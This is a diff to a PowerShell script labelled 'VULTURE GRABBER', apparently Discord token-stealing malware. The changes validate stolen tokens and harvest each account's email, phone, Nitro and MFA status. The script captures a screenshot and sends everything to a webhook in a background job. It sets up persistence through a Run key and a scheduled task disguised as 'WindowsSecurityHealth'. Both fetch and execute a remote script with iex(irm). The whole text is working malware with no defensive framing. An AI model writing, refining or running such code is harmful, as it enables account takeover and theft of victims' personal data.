@@ -169,18 +169,35 @@ if (-not $isSystem -and $firstRun) {
     }
 }
 
-# === INSTANT TOKEN EXTRACTION (NO VALIDATION DELAY) ===
-$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)
+# === TOKEN VALIDATION ===
+$validTokens = [System.Collections.Generic.List[object]]::new()
 
-# ... [your existing extraction code] ...
-
-# SKIP VALIDATION - SEND ALL TOKENS IMMEDIATELY
 if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
-    $report = "**[VULTURE GRABBER]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nTokens Found: $($found.Count)`n`n" + 
-              (($found | Sort-Object) -join "`n")
-    
-    # Send immediately
-    try { Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} } catch {}
+    $validated = [System.Collections.Generic.List[string]]::new()
+    foreach ($token in $found) {
+        if (Validate-Token -token $token) { $validated.Add($token) }
+    }
+
+    foreach ($token in $validated) {
+        try {
+            $headers = @{
+                Authorization = $token
+                "User-Agent"  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+            }
+            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 3 -ErrorAction Stop
+            if ($r.id) {
+                $validTokens.Add([PSCustomObject]@{
+                    u    = "$($r.username)#$($r.discriminator)"
+                    id   = $r.id
+                    em   = if ($r.email) { $r.email } else { "N/A" }
+                    ph   = if ($r.phone) { $r.phone } else { "N/A" }
+                    ni   = switch ($r.premium_type) { 1 { "Classic" } 2 { "Nitro" } default { "None" } }
+                    mf   = if ($r.mfa_enabled) { "Yes" } else { "No" }
+                    token = $token
+                })
+            }
+        } catch {}
+    }
 }
 
 # === SCREENSHOT ===
@@ -192,52 +209,49 @@ $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
 $bytes = $ms.ToArray()
 $ms.Close()
 
-# === SEND TO WEBHOOK ===
+# === SEND TO WEBHOOK IN BACKGROUND ===
 if ($firstRun) {
-    $report = "**[VULTURE GRABBER]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nValid Tokens: $($validTokens.Count)`n`n"
-    
-    # Build token list
-    foreach ($ti in $validTokens) {
-        $report += "**$($ti.u)**`nToken: ``$($ti.token)```nID: $($ti.id)`nEmail: $($ti.em)`nPhone: $($ti.ph)`nNitro/MFA: $($ti.ni)/$($ti.mf)`n`n"
-    }
-
-    # Send main message
-    try {
-        Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue
-    } catch {}
-
-    # Send screenshot if exists
-    if ($bytes) {
+    Start-Job -ScriptBlock {
+        param($hook, $validTokens, $bytes, $pc, $user)
+        $report = "**[VULTURE GRABBER]**`nPC: $pc`nUser: $user`nValid Tokens: $($validTokens.Count)`n`n"
+        foreach ($ti in $validTokens) {
+            $report += "**$($ti.u)**`nToken: ``$($ti.token)```nID: $($ti.id)`nEmail: $($ti.em)`nPhone: $($ti.ph)`nNitro/MFA: $($ti.ni)/$($ti.mf)`n`n"
+        }
+        
         try {
-            $boundary = "----VultureBoundary" + (Get-Random).ToString()
-            $LF = "`r`n"
-            $body = (
-                "--$boundary$LF" +
-                "Content-Disposition: form-data; name=`"file`; filename=`"screenshot.png`"$LF" +
-                "Content-Type: image/png$LF$LF"
-            )
-            $footer = "$LF--$boundary--$LF"
-            
-            $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
-            $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
-            $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
-            
-            $webRequest = [Net.WebRequest]::Create($hook)
-            $webRequest.Method = "POST"
-            $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
-            $webRequest.ContentLength = $totalLength
-            
-            $reqStream = $webRequest.GetRequestStream()
-            $reqStream.Write($headerBytes, 0, $headerBytes.Length)
-            $reqStream.Write($bytes, 0, $bytes.Length)
-            $reqStream.Write($footerBytes, 0, $footerBytes.Length)
-            $reqStream.Close()
-            $webRequest.GetResponse()
+            Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue
         } catch {}
-    }
+        
+        if ($bytes) {
+            try {
+                $boundary = "----VultureBoundary" + (Get-Random).ToString()
+                $LF = "`r`n"
+                $body = "--$boundary$LFContent-Disposition: form-data; name=`"file`; filename=`"screenshot.png`"$LFContent-Type: image/png$LF$LF"
+                $footer = "$LF--$boundary--$LF"
+                $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
+                $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
+                $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
+                
+                $webRequest = [Net.WebRequest]::Create($hook)
+                $webRequest.Method = "POST"
+                $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
+                $webRequest.ContentLength = $totalLength
+                
+                $reqStream = $webRequest.GetRequestStream()
+                $reqStream.Write($headerBytes, 0, $headerBytes.Length)
+                $reqStream.Write($bytes, 0, $bytes.Length)
+                $reqStream.Write($footerBytes, 0, $footerBytes.Length)
+                $reqStream.Close()
+                $webRequest.GetResponse()
+            } catch {}
+        }
+    } -ArgumentList $hook, $validTokens, $bytes, $env:COMPUTERNAME, $env:USERNAME
 }
 
 # === PERSISTENCE ===
 $cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $cmd -ErrorAction SilentlyContinue
 schtasks /create /tn "WindowsSecurityHealth" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
+
+# === INSTANT EXIT ===
+exit
